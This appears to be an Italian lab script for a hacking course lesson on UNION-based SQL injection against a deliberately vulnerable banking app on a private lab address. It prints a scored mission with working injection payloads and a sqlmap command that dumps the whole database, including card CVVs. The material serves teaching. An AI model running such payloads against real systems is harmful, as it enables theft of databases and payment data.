#!/usr/bin/env bash
# Lezione 13 · lato Kali · SQL injection avanzata (UNION) e sqlmap.
# Di sola lettura: verifica la Banca e mostra la missione. Idempotente.
set -uo pipefail

TARGET_IP="10.10.10.20"

echo "== Lezione 13 · SQL injection avanzata e sqlmap =="
echo
if curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080/cerca?conto=x"; then
  echo "[OK] La Banca risponde su :8080."
else
  echo "[--] La Banca non risponde. Sul bersaglio:  lab 12  e poi  lab 13 ."
fi
command -v sqlmap >/dev/null 2>&1 && echo "[OK] sqlmap presente." || echo "[--] sqlmap mancante."

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Da 'entrare' a 'svuotare il database'
------------------------------------------------------------
 Il campo vulnerabile e' la ricerca:  /cerca?conto=...
 Restituisce 3 colonne (utente, conto, nota): con UNION puoi far
 restituire dati da ALTRE tabelle.

 [ ] 1  Scopri le tabelle del database                         (informativo)
        curl "http://10.10.10.20:8080/cerca?conto=' UNION SELECT name,sql,'x' FROM sqlite_master -- "

 [ ] 2  Estrai il segreto con UNION (a mano)                    (+30)
        curl "http://10.10.10.20:8080/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- "

 [ ] 3  Lascia lavorare sqlmap: trova e svuota tutto           (+40)
        sqlmap -u "http://10.10.10.20:8080/cerca?conto=1" -p conto --batch --dbms=sqlite --dump
        # tra le tabelle scaricate c'e' 'carte': leggi il cvv della Tesoreria

 Concetti:  UNION SELECT  numero e tipo di colonne  sqlite_master  sqlmap
------------------------------------------------------------
MSG
